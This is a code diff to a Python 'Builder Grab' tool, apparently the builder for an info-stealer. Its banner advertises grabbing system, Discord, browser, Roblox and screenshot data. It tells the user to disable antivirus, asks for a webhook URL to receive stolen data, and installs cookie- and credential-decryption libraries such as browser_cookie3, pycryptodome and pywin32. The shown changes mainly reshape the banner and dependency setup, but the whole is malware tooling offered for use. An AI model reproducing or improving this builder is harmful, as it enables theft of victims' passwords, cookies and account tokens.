@@ -1416,17 +1416,19 @@ import random
 import os
 import subprocess
 import requests
+import shutil
 from tkinter import Tk, filedialog
 
 Title("Builder Grab")
 
-print(f"""{color.WHITE}                      -----------------------------------------------------------------------------
-                      {color.WHITE}| {color.RED}System Grab{color.WHITE} | {color.RED}Discord Grab{color.WHITE} | {color.RED}Browser Grab{color.WHITE} | {color.RED}Roblox Grab{color.WHITE} | {color.RED}Screenshot Grab{color.WHITE} |
-                      -----------------------------------------------------------------------------
+print(f"""{color.WHITE}                      
+                      ╔═════════════╦══════════════╦══════════════╦═════════════╦═════════════════╗
+                      {color.WHITE}║ {color.RED}System Grab{color.WHITE} ║ {color.RED}Discord Grab{color.WHITE} ║ {color.RED}Browser Grab{color.WHITE} ║ {color.RED}Roblox Grab{color.WHITE} ║ {color.RED}Screenshot Grab{color.WHITE} ║
+                      ╚═════════════╩══════════════╩══════════════╩═════════════╩═════════════════╝
 
 {color.RED}[!] | Disable your antivirus !""")
 
-webhook = input(f"\n{color.RED}[?] | URL Webhook -> {color.RESET}")
+webhook = input(f"{color.RED}[?] | URL Webhook -> {color.RESET}")
 try:
     response = requests.head(webhook)
     if response.status_code != 200:
@@ -1501,117 +1503,16 @@ print(f"{color.RED}\n[!] | Installing missing modules:{color.RESET}")
 
 subprocess.check_call(['pip', 'install', '--upgrade', 'discord.py'])
 
-try:
-   import platform
-except:
-   ModuleInstall("platform")
-try:
-   import ctypes
-except:
-   ModuleInstall("ctypes")
-
-try:
-   import screeninfo
-except:
-   ModuleInstall("screeninfo")
-
-try:
-   import psutil
-except:
-   ModuleInstall("psutil")
-
-try:
-   import GPUtil
-except:
-   ModuleInstall("GPUtil")
-
-try:
-   import sqlite3
-except:
-   ModuleInstall("sqlite3")
-
-try:
-   import json
-except:
-   ModuleInstall("json")
-
-try:
-   import socket
-except:
-   ModuleInstall("socket")
-
-try:
-   import requests
-except:
-   ModuleInstall("requests")
-
-try:
-   from Crypto.Cipher import AES
-except:
-   ModuleInstall("pycryptodome")
-
-try:
-   import datetime
-except:
-   ModuleInstall("datetime")
-
-try:
-   import base64
-except:
-   ModuleInstall("base64")
-
-try:
-   import re
-except:
-   ModuleInstall("re")
-try:
-   import string
-except:
-   ModuleInstall("string")
-try:
-   import win32api
-except:
-   ModuleInstall("win32api")
-   ModuleInstall("win32")
-try:
-   import discord
-except:
-   ModuleInstall("discord")
-   ModuleInstall("discord.py")
-try:
-   import sys
-except:
-   ModuleInstall("sys")
-try:
-   import shutil
-except:
-   ModuleInstall("shutil")
-try:
-   import pathlib
-except:
-   ModuleInstall("pathlib")
-try:
-   import zipfile
-except:
-   ModuleInstall("zipfile")
-try:
-   import win32crypt
-except:
-   ModuleInstall("win32crypt")
-   ModuleInstall("win32")
-try:
-   import uuid
-except:
-   ModuleInstall("uuid")
-try:
-   from PIL import ImageGrab
-except:
-   ModuleInstall("pyautogui")
-   ModuleInstall("imagegrab")
-try:
-   import browser_cookie3
-except:
-   ModuleInstall("browser_cookie3")
+ModuleInstall("screeninfo")
+ModuleInstall("psutil")
+ModuleInstall("GPUtil")
+ModuleInstall("sqlite3")
+ModuleInstall("requests")
+ModuleInstall("pycryptodome")
+ModuleInstall("discord")
+ModuleInstall("pywin32")
+ModuleInstall("Pillow")
+ModuleInstall("browser_cookie3")
 
 with open(file_text, 'w', encoding='utf-8') as file:
  file.write(f"webhook_url = \"{webhook}\"")
